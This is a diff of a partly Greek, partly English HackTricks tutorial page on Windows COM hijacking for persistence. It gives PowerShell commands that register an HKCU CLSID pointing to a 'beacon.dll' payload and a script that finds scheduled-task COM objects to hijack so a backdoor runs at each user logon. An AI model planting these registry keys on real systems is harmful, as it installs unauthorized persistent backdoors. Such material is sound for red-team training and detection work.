@@ -1,38 +1,39 @@
 # COM Hijacking
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-### Αναζήτηση μη υπαρκτών στοιχείων COM
+### Αναζητώντας ανύπαρκτα COM components
 
-Καθώς οι τιμές του HKCU μπορούν να τροποποιηθούν από τους χρήστες, το **COM Hijacking** μπορεί να χρησιμοποιηθεί ως ένα **μηχανισμός διατήρησης**. Χρησιμοποιώντας το `procmon` είναι εύκολο να βρεθούν αναζητούμενα μη υπαρκτά COM καταγεγραμμένα στοιχεία που ένας επιτιθέμενος μπορεί να δημιουργήσει για να διατηρηθεί. Φίλτρα:
+Καθώς οι τιμές του HKCU μπορούν να τροποποιηθούν από τους χρήστες, το **COM Hijacking** θα μπορούσε να χρησιμοποιηθεί ως **μόνιμη μηχανισμός**. Χρησιμοποιώντας το `procmon`, είναι εύκολο να βρείτε αναζητημένα COM registry που δεν υπάρχουν και που ένας επιτιθέμενος θα μπορούσε να δημιουργήσει για να παραμείνει. Φίλτρα:
 
-* Λειτουργίες **RegOpenKey**.
-* όπου το _Αποτέλεσμα_ είναι **ΤΟ ΟΝΟΜΑ ΔΕΝ ΒΡΕΘΗΚΕ**.
-* και το _Μονοπάτι_ τελειώνει με **InprocServer32**.
+* **RegOpenKey** λειτουργίες.
+* όπου το _Result_ είναι **NAME NOT FOUND**.
+* και το _Path_ τελειώνει με **InprocServer32**.
 
-Αφού αποφασίσετε ποιο μη υπαρκτό COM θέλετε να προσωποποιήσετε, εκτελέστε τις παρακάτω εντολές. _Να είστε προσεκτικοί αν αποφασίσετε να προσωποποιήσετε ένα COM που φορτώνεται κάθε λίγα δευτερόλεπτα, καθώς αυτό μπορεί να είναι υπερβολικό._&#x20;
+Αφού αποφασίσετε ποιο ανύπαρκτο COM να προσποιηθείτε, εκτελέστε τις παρακάτω εντολές. _Να είστε προσεκτικοί αν αποφασίσετε να προσποιηθείτε ένα COM που φορτώνεται κάθε λίγα δευτερόλεπτα, καθώς αυτό θα μπορούσε να είναι υπερβολικό._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-### Εκμετάλλευση ευπαθών στοιχείων COM του Task Scheduler
+### Hijackable Task Scheduler COM components
 
-Οι εργασίες των Windows χρησιμοποιούν προσαρμοσμένες ενεργοποιήσεις για να καλούν αντικείμενα COM και επειδή εκτελούνται μέσω του Task Scheduler, είναι πιο εύκολο να προβλέψετε πότε θα ενεργοποιηθούν.
+Windows Tasks use Custom Triggers to call COM objects and because they're executed through the Task Scheduler, it's easier to predict when they're gonna be triggered.
 
-<pre class="language-powershell"><code class="lang-powershell"># Εμφάνιση COM CLSIDs
+<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
 
 foreach ($Task in $Tasks)
@@ -55,15 +56,15 @@ Write-Host
 }
 }
 
-# Δείγμα Αποτελέσματος:
+# Sample Output:
 <strong># Όνομα Εργασίας:  Παράδειγμα
-</strong># Διαδρομή Εργασίας:  \Microsoft\Windows\Παράδειγμα\
+</strong># Διαδρομή Εργασίας:  \Microsoft\Windows\Example\
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
-# [περισσότερα όπως το προηγούμενο...]</code></pre>
+# [more like the previous one...]</code></pre>
 
-Ελέγχοντας τα αποτελέσματα, μπορείτε να επιλέξετε ένα που θα εκτελείται **κάθε φορά που ο χρήστης συνδέεται** για παράδειγμα.
+Checking the output you can select one that is going to be executed **every time a user logs in** for example.
 
-Τώρα αναζητώντας το CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** στο **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** και στο HKLM και HKCU, συνήθως θα διαπιστώσετε ότι η τιμή δεν υπάρχει στο HKCU.
+Now searching for the CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** and in HKLM and HKCU, you usually will find that the value doesn't exist in HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -84,18 +85,19 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-Στη συνέχεια, μπορείτε απλά να δημιουργήσετε την καταχώρηση HKCU και κάθε φορά που ο χρήστης συνδέεται, το backdoor σας θα εκτελείται.
+Τότε, μπορείτε απλά να δημιουργήσετε την καταχώρηση HKCU και κάθε φορά που ο χρήστης συνδέεται, η πίσω πόρτα σας θα ενεργοποιείται.
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
